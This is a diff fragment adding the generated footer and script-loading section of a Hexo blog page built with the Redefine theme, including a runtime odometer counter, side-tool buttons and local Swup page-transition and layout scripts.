+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+</body>
+</html>
